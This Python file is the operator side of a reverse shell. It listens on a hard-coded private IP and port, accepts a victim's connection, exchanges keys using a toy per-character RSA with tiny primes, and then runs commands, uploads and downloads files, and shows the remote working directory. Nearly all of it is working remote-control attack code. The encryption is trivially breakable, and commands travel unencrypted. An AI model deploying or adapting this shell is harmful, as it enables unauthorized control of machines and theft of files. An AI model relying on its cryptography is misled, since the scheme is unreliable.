import socket


def rsa(plaintxt, n, publ_key):
    numEncrypt = []
    plaintxt = list(plaintxt)
    cipher = ''

    for letter in plaintxt:
        numEncrypt.append(ord(letter))
    for number in numEncrypt:
        encrypt = (number ** publ_key) % n
        cipher += chr(encrypt)
    return cipher


def d_rsa(ciphertxt, n, priv_key):
    numDecrypt = []
    plaintxt = ''
    ciphertxt = list(ciphertxt)

    for letter in ciphertxt:
        numDecrypt.append(ord(letter))
    for number in numDecrypt:
        decrypt = (number ** priv_key) % n
        plaintxt += chr(decrypt)
    return plaintxt


ps = 47
qs = 71
ns = ps * qs
pu_k = [97, ns]
pr_k = [1693, ns]

HOST_IP = "10.0.5.198"
PORT = 5000
BUFFER = 1024 * 64
SEP = "<separator>"
ack = "ACK"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST_IP, PORT))
s.listen(5)
print(f"\n[+] Listening for connection on {HOST_IP}:{PORT}...\n")

client_socket, addr = s.accept()

print(f"[+] {addr[0]}:{addr[1]} Connected!")

clientKey = client_socket.recv(BUFFER).decode()
clientKey = clientKey.split(SEP)

clientKey[0] = int(clientKey[0])
clientKey[1] = int(clientKey[1])

print(f"[+] Keys received......: {clientKey[0]} : {clientKey[1]} : {clientKey[2]}")

tx = str(pu_k[0]) + SEP + str(pu_k[1])
client_socket.send(rsa(tx, clientKey[1], clientKey[0]).encode())

print("\n[+] Accessing remote machine...")

working_dir = d_rsa(client_socket.recv(BUFFER).decode(), pr_k[1], pr_k[0])
print("[+] Remote Machine current directory ->", working_dir, "\n")

while True:
    command = input(f"\n{working_dir}>$ ")

    if not command.strip():
        continue

    client_socket.send(command.encode())

    if command.lower() == "exit":
        break

    if command[0:6].lower() == "upload":
        cmd_split = command.split()
        with open(cmd_split[1], "rb") as file:
            content = file.read(BUFFER)
            client_socket.send(content)
            file.close()

    if command[0:8].lower() == "download":
        cmd_div = command.split()
        with open(cmd_div[1], "wb") as file:
            content = client_socket.recv(BUFFER)
            file.write(content)
            file.close()

    output = client_socket.recv(BUFFER).decode()
    print(output)
    client_socket.send(ack.encode())
    working_dir = client_socket.recv(BUFFER).decode()


print("[-] Closing Connection")
print(".")
print(".")
s.close()
print("Done!")
